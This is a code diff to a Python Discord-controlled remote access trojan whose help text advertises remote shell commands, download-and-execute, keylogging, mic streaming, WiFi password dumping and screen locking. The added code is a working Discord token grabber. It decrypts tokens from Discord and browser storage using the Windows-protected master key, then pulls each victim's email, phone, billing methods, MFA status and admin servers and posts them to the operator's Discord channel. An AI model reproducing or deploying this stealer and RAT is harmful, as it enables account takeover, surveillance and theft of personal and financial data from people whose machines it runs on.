@@ -1,6 +1,5 @@
 # Ersetzen Sie dies durch Ihr Bot-Token
 TOKEN = 'YOUR_BOT_TOKEN'
-
 GUILD_ID = YOUR_GUILD_ID
 
 # Ersetzen Sie dies durch Ihre Discord-Benutzer-ID(s), die den Bot steuern dürfen
@@ -49,6 +48,9 @@ from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 from comtypes import CLSCTX_ALL
 import numpy as np
 import cv2
+from Crypto.Cipher import AES
+from discord import Embed
+from win32crypt import CryptUnprotectData
 
 admin_status_file = "admin_status.txt"  # Füge diese Zeile hinzu, um die Variable zu definieren
 
@@ -210,17 +212,18 @@ def is_bot_or_command(message):
         message.content.startswith(bot.command_prefix)
     )
     
+
+# Command to display help
 @bot.command(name='help')
 async def custom_help(ctx):
     help_text = """
     **Available Commands:**
-
     `!ping` - Shows the bot's latency.
     `!screenshot` - Takes a screenshot and sends it.
     `!cmd <command>` - Executes a CMD command.
     `!powershell <command>` - Executes a PowerShell command.
     `!file_upload <target_path>` - Uploads a file.
-    `!file_download <file_path>` - Downloads a file.
+    `!file_download <file_path>` - Sends a file or Folder to Discord.
     `!execute <url>` - Downloads and executes a file from the URL.
     `!notify <title> <message>` - Sends a notification.
     `!restart` - Restarts the PC.
@@ -229,26 +232,31 @@ async def custom_help(ctx):
     `!stop` - Stops the bot.
     `!wifi` - Shows WiFi profiles and passwords.
     `!system_info` - Shows system information.
-    `!cpu_usage` - Shows the current CPU usage.
-    `!tasklist` - List's every running Process with Name and PID.
+    `!tasklist` - Lists every running process with Name and PID.
     `!taskkill <pid>` - Kills a process with the given PID.
     `!tts <message>` - Plays a custom text-to-speech message.
     `!mic_stream_start` - Starts a live stream of the microphone to a voice channel.
     `!mic_stream_stop` - Stops the mic stream if activated.
     `!keylog <on/off>` - Activates or deactivates keylogging.
     `!bsod` - Triggers a Blue Screen of Death.
-    `!rickroll` - ~you guessed it. It plays an Rickroll that is inescapable till the End.
-    `!input <block/unblock>` - Completely blocks or unblocks the User Input, Mouse and Keyboard.
-    `!blackscreen <on/off>` - Makes the screen completely black and lets the Mice disappear.
+    `!rickroll` - Plays an inescapable Rickroll video.
+    `!input <block/unblock>` - Blocks or unblocks user input.
+    `!blackscreen <on/off>` - Makes the screen completely black.
     `!volume` - Shows volume information and available commands.
-    `!volume <mute/unmute` - Mutes or unmutes the Device.
-    `!volume <number from 1-100>` - Sets the Volume to a specific Percentage.
+    `!volume <mute/unmute>` - Mutes or unmutes the device.
+    `!volume <number from 1-100>` - Sets the volume to a specific percentage.
+    `!grab_discord` - Grabs Discord Tokens, Billing and Contact Information.
     """
-    await ctx.send(help_text)
+    embed = Embed(title="Help", description=help_text, color=0x0084ff)
+    await ctx.send(embed=embed)
     
-# Define the generic error handler function
 async def generic_command_error(ctx, error):
-    msg = await ctx.send(f"⚠️ An error occurred: {error}")
+    embed = discord.Embed(
+        title="⚠️ Error",
+        description=f"```{error}```",
+        color=discord.Color.red()  
+    )
+    msg = await ctx.send(embed=embed)
     await msg.delete(delay=5)
     
 @bot.command()
@@ -1206,6 +1214,224 @@ async def blackscreen(ctx, action: str = None):
         await send_temporary_message(ctx, "❌ **Error:** Invalid argument. Use `on` or `off`.", duration=10)
 
 blackscreen.error(generic_command_error)
+
+class grab_discord():
+    def initialize(self, raw_data):
+        return fetch_tokens().upload(raw_data)
+
+class extract_tokens:
+    def __init__(self) -> None:
+        self.base_url = "https://discord.com/api/v9/users/@me"
+        self.appdata = os.getenv("localappdata")
+        self.roaming = os.getenv("appdata")
+        self.regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
+        self.regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
+        self.tokens, self.uids = [], []
+        self.extract()
+
+    def extract(self) -> None:
+        paths = {
+            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
+            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
+            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
+            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
+            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
+            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
+            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
+            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
+            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
+            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
+            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
+            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
+            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
+            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
+            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
+            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
+            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
+            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
+            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
+            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
+            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
+        }
+
+        for name, path in paths.items():
+            if not os.path.exists(path): continue
+            _discord = name.replace(" ", "").lower()
+            if "cord" in path:
+                if not os.path.exists(self.roaming + f'\\{_discord}\\Local State'): continue
+                for file_name in os.listdir(path):
+                    if file_name[-3:] not in ["log", "ldb"]: continue
+                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                        for y in re.findall(self.regexp_enc, line):
+                            token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{_discord}\\Local State'))
+                    
+                            if self.validate_token(token):
+                                uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
+                                if uid not in self.uids:
+                                    self.tokens.append(token)
+                                    self.uids.append(uid)
+
+            else:
+                for file_name in os.listdir(path):
+                    if file_name[-3:] not in ["log", "ldb"]: continue
+                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                        for token in re.findall(self.regexp, line):
+                            if self.validate_token(token):
+                                uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
+                                if uid not in self.uids:
+                                    self.tokens.append(token)
+                                    self.uids.append(uid)
+
+        if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
+            for path, _, files in os.walk(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
+                for _file in files:
+                    if not _file.endswith('.sqlite'):
+                        continue
+                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
+                        for token in re.findall(self.regexp, line):
+                            if self.validate_token(token):
+                                uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
+                                if uid not in self.uids:
+                                    self.tokens.append(token)
+                                    self.uids.append(uid)
+
+    def validate_token(self, token: str) -> bool:
+        r = requests.get(self.base_url, headers={'Authorization': token})
+        if r.status_code == 200: return True
+        return False
+    
+    def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
+        iv = buff[3:15]
+        payload = buff[15:]
+        cipher = AES.new(master_key, AES.MODE_GCM, iv)
+        decrypted_pass = cipher.decrypt(payload)
+        decrypted_pass = decrypted_pass[:-16].decode()
+        return decrypted_pass
+
+    def get_master_key(self, path: str) -> str:
+        if not os.path.exists(path): return
+        if 'os_crypt' not in open(path, 'r', encoding='utf-8').read(): return
+        with open(path, "r", encoding="utf-8") as f: c = f.read()
+        local_state = json.loads(c)
+
+        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        master_key = master_key[5:]
+        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
+        return master_key
+
+class fetch_tokens:
+    def __init__(self):
+        self.tokens = extract_tokens().tokens
+    
+    def upload(self, raw_data):
+        if not self.tokens:
+            return ["Keine Tokens gefunden."]  # Return a message if no tokens are found
+        
+        final_to_return = []
+        for token in self.tokens:
+            try:
+                user_response = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token})
+                user_response.raise_for_status()  # Raise an error for bad responses
+                user_data = user_response.json()
+
+                # Fetch billing information
+                billing_response = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token})
+                billing_response.raise_for_status()
+                billing_data = billing_response.json()
+
+                # Fetch guilds
+                guilds_response = requests.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': token})
+                guilds_response.raise_for_status()
+                guilds_data = guilds_response.json()
+
+                # Prepare user information
+                username = user_data['username'] + '#' + user_data['discriminator']
+                user_id = user_data['id']
+                email = user_data.get('email', 'None')
+                phone = user_data.get('phone', 'None')
+                mfa = user_data['mfa_enabled']
+                avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{user_data['avatar']}.png" if user_data['avatar'] else None
+                
+                # Determine Nitro status
+                nitro = {0: 'None', 1: 'Nitro Classic', 2: 'Nitro', 3: 'Nitro Basic'}.get(user_data['premium_type'], 'None')
+
+                # Prepare billing information
+                payment_methods = ', '.join(method['type'] for method in billing_data) if billing_data else 'None'
+
+                # Prepare guild information
+                hq_guilds = []
+                for guild in guilds_data:
+                    admin = int(guild["permissions"]) & 0x8 != 0
+                    if admin and guild['approximate_member_count'] >= 100:
+                        invite = "https://discord.gg/example"  # Placeholder for invite link
+                        data = f"**{guild['name']} ({guild['id']})** | Members: `{guild['approximate_member_count']}`"
+                        hq_guilds.append(data)
+
+                hq_guilds = '\n'.join(hq_guilds) if hq_guilds else 'None'
+
+                # Create embed message
+                if not raw_data:
+                    embed = Embed(title=f"{username} ({user_id})", color=0x0084ff)
+                    embed.set_thumbnail(url=avatar)
+                    embed.add_field(name="📜 Token:", value=f"```{token}```", inline=False)
+                    embed.add_field(name="💎 Nitro:", value=nitro, inline=False)
+                    embed.add_field(name="💳 Billing:", value=payment_methods, inline=False)
+                    embed.add_field(name="🔒 MFA:", value=mfa, inline=False)
+                    embed.add_field(name="📧 Email:", value=email, inline=False)
+                    embed.add_field(name="📳 Phone:", value=phone, inline=False)
+                    embed.add_field(name="🏰 HQ Guilds:", value=hq_guilds, inline=False)
+                    final_to_return.append(embed)
+                else:
+                    final_to_return.append(json.dumps({
+                        'username': username,
+                        'token': token,
+                        'nitro': nitro,
+                        'billing': payment_methods,
+                        'mfa': mfa,
+                        'email': email,
+                        'phone': phone,
+                        'hq_guilds': hq_guilds
+                    }))
+
+            except requests.exceptions.HTTPError as http_err:
+                print(f"HTTP error occurred: {http_err}")  # Log the HTTP error
+                final_to_return.append(f"Fehler beim Abrufen der Benutzerdaten: {http_err}")
+            except Exception as err:
+                print(f"An error occurred: {err}")  # Log any other errors
+                final_to_return.append(f"Ein Fehler ist aufgetreten: {err}")
+
+        return final_to_return  # Return the final data
+
+async def long_running_task(ctx, raw_data):
+    tokens_grabber = grab_discord()
+    extracted_data = tokens_grabber.initialize(raw_data)  # Get the extracted data
+
+    if extracted_data:
+        for data in extracted_data:
+            await ctx.send(embed=data)  # Send each embed to the chat
+        await ctx.send("✅ Tokens have been successfully extracted and sent!")  # Success message
+    else:
+        await ctx.send("No Data found.")  # Message if no data is found
+
+@bot.command(name='grab_discord')
+@commands.check(is_authorized)
+async def grab_tokens(ctx):
+    if not in_correct_channel(ctx):
+        await send_temporary_message(ctx, "Dieser Befehl kann nur im spezifischen Channel für diesen PC ausgeführt werden.", duration=10)
+        return
+
+    loading_message = await ctx.send("🔄 Extracting Discord tokens...")  # Send loading message
+    try:
+        raw_data = False  # Set to True if you want raw data instead of embeds
+        asyncio.create_task(long_running_task(ctx, raw_data))  # Run the long-running task in the background
+    except Exception as e:
+        await log_message(ctx, f'Error whilst extracting tokens: {str(e)}', duration=10)
 
 def main():
     time.sleep(15)
